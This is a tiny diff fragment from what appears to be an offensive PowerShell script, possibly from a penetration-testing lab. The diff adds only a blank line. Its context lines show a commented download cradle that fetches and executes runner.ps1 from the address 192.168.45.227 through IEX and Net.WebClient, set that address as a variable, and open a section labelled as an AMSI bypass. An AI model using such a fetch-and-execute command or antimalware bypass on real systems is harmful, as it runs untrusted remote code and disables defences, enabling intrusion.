@@ -1,5 +1,6 @@
 #powershell -c IEX (New-Object Net.WebClient).DownloadString('http://192.168.45.227/runner.ps1')
 
+
 $ip = '192.168.45.227'
 
 #amsi bypass
